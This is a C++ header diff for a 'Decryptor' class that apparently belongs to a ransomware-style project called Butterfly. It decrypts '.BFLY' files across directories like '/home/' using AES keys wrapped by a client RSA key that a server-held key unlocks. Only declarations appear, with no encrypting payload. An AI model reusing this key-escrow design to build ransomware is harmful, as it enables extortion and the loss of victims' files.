@@ -15,44 +15,68 @@ namespace hybrid
 {
 
 /**
- * Class Decryptor to decrypt the AES Key collection file and the CPrivateRSA key
+ * Class Decryptor to decrypt all files with AES and the CPrivateRSA as well as AES key with RSA
  */
 class Decryptor
 {
 
 private:
-    std::string _decryptedCPrivateRSA, _decryptedAESKey, _decryptedAESIV, _aesKeyDbFilepath;;
-    std::shared_ptr<rsa::RSADecryptor> _rsaDecryptorAESKey, _rsaDecryptorAESIV, _rsaDecryptorCPrivateRSA;
+    std::string _decryptedCPrivateRSA, _aesKeyDbFilepath;;
+    std::shared_ptr<rsa::RSADecryptor> _rsaDecryptorAESKey, _rsaDecryptorCPrivateRSA;
     std::unique_ptr<aes::AESDecryptor> _aesDecryptor;
     std::unique_ptr<AESKeyDatabase> _aesKeyDatabase;
 
+    /**
+     *
+     * @param filepath
+     */
+    static void removeBFLYEnding(std::string &filepath);
+
+    /**
+     *
+     */
+    static void removeDecryptedFiles();
+
 public:
+
     /**
      * Constructor Decryptor
+     *
+     *  Usage:
+     *       std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor(2048));
+     *       decryptor->decryptCPrivateRSA("SPrivateRSA.pem", "CPrivateRSA.bin");
+     *       decryptor->invokeDir("/home/");
+     *
+     * @param aesKeyDbFilepath:
      */
-    Decryptor(const std::string &aesKeyDbFilepath = "AES.db");
+    explicit Decryptor(const std::string &aesKeyDbFilepath = "AES.db");
 
     /**
      * Destructor Decryptor
      */
     ~Decryptor();
 
-    void invokeDir(const std::string &path);
     /**
-     * Decrypt the CPrivateRSA binary file
      *
-     * @param keyFromServer: SPrivateRSA.pem from server
-     * @return decrypted CPrivateRSA string
+     * @param path
      */
-    std::string decryptCPrivateRSA(const std::string &keyFromServer);
+    void invokeDir(const std::string &path);
 
     /**
-     * Decrypt the AES Key Collection file
+     * Decrypt the CPrivateRSA.bin file
      *
-     * @param decryptedCPrivateRSA: decrypted CPrivateRSA string
-     * @return decrpyted AES Key Collection file
+     * @param pkeyFromServer: SPrivateRSA.pem from server
+     * @param encCPrivateRSAFile: encrypted CPrivateRSA.bin file
+     * @return decrypted CPrivateRSA string
      */
-    std::string decryptAESKeyFile(const std::string &aesKeyFile);
+    std::string decryptCPrivateRSA(const std::string &pkeyFromServer, const std::string &encCPrivateRSAFile);
+
+    /**
+     *
+     * @param filepath
+     * @return
+     */
+    std::string  decryptAESKeyPair(const std::string &filepath);
 
     /**
      * Decrypt the file with the AES Key
@@ -61,7 +85,7 @@ public:
      * @param aesKey: aes key for the file
      */
     void decryptFileWithAES(const std::string &filepath, const std::string &aesKey, const std::string & aesIV);
-    std::string  decryptAESKey(const std::string &cprivate, const std::string &filename);
+
 };
 
 } // namespace hybrid
